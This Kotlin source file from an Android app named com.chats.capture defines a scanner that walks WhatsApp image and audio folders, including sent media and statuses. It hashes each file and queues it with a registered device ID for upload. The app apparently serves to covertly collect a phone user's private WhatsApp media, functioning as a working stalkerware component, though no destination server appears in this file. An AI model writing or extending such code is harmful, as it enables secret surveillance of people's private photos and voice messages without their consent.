package com.chats.capture.utils

import android.content.Context
import android.os.Build
import android.os.Environment
import com.chats.capture.CaptureApplication
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.File
import java.security.MessageDigest

/**
 * Scanner for WhatsApp media files (images and audio)
 */
class WhatsAppMediaScanner(private val context: Context) {
    
    private val mediaFileDao: MediaFileDao = (context.applicationContext as CaptureApplication).database.mediaFileDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    private val whatsappPackage = "com.whatsapp"
    
    /**
     * Scan WhatsApp media folders for images and audio files
     * Saves them to media_files database for upload
     */
    suspend fun scanMediaFiles(): List<MediaFile> = withContext(Dispatchers.IO) {
        try {
            val deviceId = deviceRegistrationManager.getDeviceId()
            val mediaFiles = mutableListOf<MediaFile>()
            
            // Get WhatsApp media directories
            val mediaDirectories = getWhatsAppMediaDirectories()
            
            mediaDirectories.forEach { directory ->
                if (directory.exists() && directory.isDirectory) {
                    scanDirectory(directory, mediaFiles, deviceId)
                }
            }
            
            // Save to database
            mediaFiles.forEach { mediaFile ->
                try {
                    // Check if file already exists (by checksum)
                    val existing = mediaFileDao.findMediaFileByChecksum(mediaFile.checksum)
                    if (existing == null) {
                        mediaFileDao.insertMediaFile(mediaFile)
                        Timber.d("WhatsApp media file added: ${mediaFile.localPath}")
                    } else {
                        Timber.v("WhatsApp media file already exists: ${mediaFile.localPath}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving WhatsApp media file: ${mediaFile.localPath}")
                }
            }
            
            Timber.d("Scanned ${mediaFiles.size} WhatsApp media files")
            mediaFiles
        } catch (e: Exception) {
            Timber.e(e, "Error scanning WhatsApp media files")
            emptyList()
        }
    }
    
    /**
     * Get WhatsApp media directories based on Android version
     */
    private fun getWhatsAppMediaDirectories(): List<File> {
        val directories = mutableListOf<File>()
        val externalStorage = Environment.getExternalStorageDirectory()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ - WhatsApp stores media in app-specific directory
            // Path: /sdcard/Android/media/com.whatsapp/WhatsApp/Media/
            val androidMediaDir = File(
                externalStorage,
                "Android/media/$whatsappPackage/WhatsApp/Media"
            )
            
            // WhatsApp Images
            directories.add(File(androidMediaDir, "WhatsApp Images"))
            directories.add(File(androidMediaDir, "WhatsApp Images/Sent"))
            directories.add(File(androidMediaDir, "WhatsApp Images/.Statuses"))
            
            // WhatsApp Audio
            directories.add(File(androidMediaDir, "WhatsApp Audio"))
            directories.add(File(androidMediaDir, "WhatsApp Audio/Sent"))
        } else {
            // Android 9 and below - WhatsApp stores media in /sdcard/WhatsApp/Media/
            val whatsappMediaDir = File(externalStorage, "WhatsApp/Media")
            
            // WhatsApp Images
            directories.add(File(whatsappMediaDir, "WhatsApp Images"))
            directories.add(File(whatsappMediaDir, "WhatsApp Images/Sent"))
            directories.add(File(whatsappMediaDir, "WhatsApp Images/.Statuses"))
            
            // WhatsApp Audio
            directories.add(File(whatsappMediaDir, "WhatsApp Audio"))
            directories.add(File(whatsappMediaDir, "WhatsApp Audio/Sent"))
        }
        
        // Also check legacy location (Android 11+ may have both)
        val legacyWhatsAppDir = File(externalStorage, "WhatsApp/Media")
        if (legacyWhatsAppDir.exists()) {
            directories.add(File(legacyWhatsAppDir, "WhatsApp Images"))
            directories.add(File(legacyWhatsAppDir, "WhatsApp Audio"))
        }
        
        return directories
    }
    
    /**
     * Recursively scan directory for WhatsApp media files
     */
    private fun scanDirectory(
        directory: File,
        mediaFiles: MutableList<MediaFile>,
        deviceId: String?
    ) {
        try {
            directory.listFiles()?.forEach { file ->
                if (file.isDirectory) {
                    // Recursively scan subdirectories
                    scanDirectory(file, mediaFiles, deviceId)
                } else if (file.isFile && isWhatsAppMediaFile(file)) {
                    try {
                        val checksum = calculateChecksum(file)
                        val mimeType = determineMimeType(file)
                        
                        val mediaFile = MediaFile(
                            deviceId = deviceId,
                            notificationId = "whatsapp_media_${file.lastModified()}",
                            appPackage = whatsappPackage,
                            localPath = file.absolutePath,
                            fileSize = file.length(),
                            mimeType = mimeType,
                            checksum = checksum,
                            uploadStatus = UploadStatus.PENDING
                        )
                        mediaFiles.add(mediaFile)
                    } catch (e: Exception) {
                        Timber.e(e, "Error processing WhatsApp media file: ${file.absolutePath}")
                    }
                }
            }
        } catch (e: Exception) {
            Timber.w(e, "Error scanning WhatsApp directory: ${directory.absolutePath}")
        }
    }
    
    /**
     * Check if file is a WhatsApp media file (images or audio)
     */
    private fun isWhatsAppMediaFile(file: File): Boolean {
        val extension = file.extension.lowercase()
        // WhatsApp image extensions
        val imageExtensions = listOf("jpg", "jpeg", "png", "webp", "gif")
        // WhatsApp audio extensions
        val audioExtensions = listOf("mp3", "ogg", "m4a", "opus", "aac")
        
        return extension in imageExtensions || extension in audioExtensions
    }
    
    /**
     * Calculate SHA-256 checksum of file
     */
    private fun calculateChecksum(file: File): String {
        val md = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                md.update(buffer, 0, bytesRead)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
    
    /**
     * Determine MIME type from file extension
     */
    private fun determineMimeType(file: File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp3" -> "audio/mpeg"
            "ogg", "opus" -> "audio/ogg"
            "m4a" -> "audio/mp4"
            "aac" -> "audio/aac"
            else -> "application/octet-stream"
        }
    }
}
